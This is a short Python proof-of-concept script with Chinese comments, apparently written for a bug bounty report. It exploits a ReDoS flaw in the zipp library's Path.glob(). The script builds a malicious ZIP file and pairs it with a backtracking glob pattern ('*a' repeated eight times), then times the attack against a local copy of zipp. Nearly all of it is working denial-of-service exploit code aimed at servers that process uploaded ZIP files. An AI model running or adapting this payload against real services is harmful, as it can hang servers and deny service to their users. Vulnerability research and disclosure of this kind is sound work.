#!/usr/bin/env python3
"""zipp ReDoS — 黑客角度最简单利用

攻击者上传 ZIP → 服务端用 zipp.Path.glob() 处理 → CPU 100%

用法:
  python3 zipp_dos_poc.py /path/to/vuln_app.py
"""
import zipfile, io, sys, os, tempfile, shutil

def build_malicious_zip() -> str:
    """生成恶意 ZIP：100 条含大量 'a' 的 entry"""
    tmp = os.path.join(tempfile.mkdtemp(suffix=''), "evil.zip")
    zf = zipfile.ZipFile(tmp, 'w')
    for i in range(100):
        zf.writestr(f"{'a' * i}/file.txt", "data")
    zf.writestr('a' * 100, 'data')  # 关键 payload
    zf.close()
    return tmp

def dos_pattern() -> str:
    """触发 O(n^k) 回溯的 glob 模式"""
    return '*a' * 8  # *a*a*a*a*a*a*a*a

if __name__ == '__main__':
    zip_path = build_malicious_zip()
    pattern = dos_pattern()
    print(f"恶意 ZIP: {zip_path}")
    print(f"ZIP 大小: {os.path.getsize(zip_path)} bytes")
    print(f"DoS 模式: {pattern}")
    print(f"\n如果服务端这样调用:")
    print(f"  from zipp import Path")
    print(f"  p = Path('{zip_path}')")
    print(f"  list(p.glob('{pattern}'))    # CPU 100%!")
    print(f"\n实测 PoC:")

    import time, signal
    sys.path.insert(0, '/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c')
    from zipp import Path

    p = Path(zip_path)
    signal.alarm(5)
    start = time.time()
    try:
        list(p.glob(pattern))
    except Exception:
        pass
    elapsed = time.time() - start
    if elapsed >= 5:
        print(f"  → ⚠️  应用挂起 >5s (被超时中断)")
    else:
        print(f"  → 完成 ({elapsed:.3f}s)")
